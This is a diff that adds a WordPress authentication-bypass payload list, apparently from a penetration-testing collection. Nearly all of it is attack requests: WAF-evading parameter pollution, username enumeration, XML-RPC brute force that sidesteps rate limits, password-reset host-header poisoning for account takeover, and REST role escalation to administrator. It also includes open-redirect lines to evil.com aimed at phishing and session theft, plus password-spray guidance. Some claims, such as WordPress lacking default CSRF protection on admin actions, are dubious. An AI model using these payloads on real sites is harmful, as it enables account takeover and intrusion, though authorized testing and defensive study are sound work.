@@ -1,0 +1,77 @@
+# WordPress Auth & Login Bypass payloads
+# Complement: wp-user-enumeration.txt (get the username first), wp-xmlrpc-attacks.txt (multicall).
+# Authorized targets only.
+
+## 1. Login noise: find the login form
+GET /wp-login.php
+GET /login
+GET /wp-admin          # often redirects to /wp-login.php
+POST /wp-login.php     # log=USER&pwd=PASS&wp-submit=Log+In
+
+## 2. Force re-auth (some plugins check $_REQUEST['reauth'])
+POST /wp-login.php
+log=admin&pwd=pass&wp-submit=Log+In&reauth=1
+
+## 3. Login parameter pollution (WAFs often drop a duplicate)
+POST /wp-login.php?a=1
+log=admin&pwd=bad&pwd=good
+# or with both single & array:
+log[]=admin&pwd[]=whatever
+
+## 4. Cookie transport to hit cdns / avoid rate-limit (send with every spray)
+Cookie: wordpress_test_cookie=WP+Cookie+check
+Cookie: wp-settings-1=...; wp-settings-time-1=...
+
+## 5. Username enumeration even when /wp-json/users is off
+GET /?rest_route=/wp/v2/users
+GET /?author=1            # 301 -> /author/admin/
+POST /wp-login.php        # differencing error strings
+# xmlrpc method calls reveal existence without password
+POST /xmlrpc.php  wp.getUsersBlogs  (see wp-xmlrpc-attacks.txt)
+
+## 6. XML-RPC bypass of login-rate-limits (test only)
+# Wordfence/Limit-Login usually block /wp-login.php POST, but xmlrpc.php keeps
+# the same auth. If it responds 200 with method list, brute/multicall there.
+
+## 7. Application passwords (REST auth without session)
+# If Application Passwords is enabled, an leaked app password grants REST:
+Authorization: Basic base64(user:app-password)
+# This is a FULL login-bypass vector if credentials leaked; also list users:
+GET /wp-json/wp/v2/users  with the above header.
+
+## 8. Password reset abuse (account-takeover chain)
+POST /wp-login.php?action=lostpassword
+user_login=admin&redirect_to=...&wp-submit=Get+New+Password
+# - If email domain mismatch allowed, the reset link is emailed to the attacker-controlled addr
+# - Check X-Forwarded-* influence on the reset link host (Host header poisoning)
+# - Some plugins let you reset by ID: /wp-login.php?action=rp&key=...&login=1
+
+## 9. REST API - try toggling a user's role if you hold ANY account
+# You'll need a nonce: grab from /wp-admin/post-new.php or /wp-admin/ (X-WP-Nonce)
+POST /wp-json/wp/v2/users/2
+Authorization: Bearer <nonce-auth>
+{"roles":["administrator"]}
+# (only works if an over-privileged plugin route blesses your session)
+
+## 10. wp-login.php redirect & open redirect (for phishing/token steal chains)
+GET /wp-login.php?redirect_to=https://evil.com
+GET /wp-login.php?redirect_to=%2F%2Fevil.com
+# not a login bypass, but pairs with phish + stolen session cookie
+
+## 11. Session cookie:: WP has no default CSRF on ajax admin actions; if you
+#     have any session at all, test admin-post.php / admin-ajax.php with GET:
+GET /wp-admin/admin-post.php?action=logout&_wpnonce=KNOWN
+# Confirm the app validates nonce ONLY when the plugin author remembered.
+
+## 12. Login page cache-decap / alternate hosts (when a host-based WAF throttles)
+GET /wp-login.php?action=register
+GET /wp-login.php?action=reauth
+GET /index.php/wp-login.php
+GET ///wp-login.php
+GET /wp-login.php?wp-submit=Log+In&log=admin&pwd=pass   # direct GET login attempt
+# If a plugin requires REQUEST_METHOD[POST], GET variant falls through to login
+
+## Use notes
+# Spray discipline: 1 password x N usernames (see wp-user-enumeration.txt),
+# never N passwords x 1 user on production login. Respect lockout policies.
+# Every method here is authorized-targets-only.
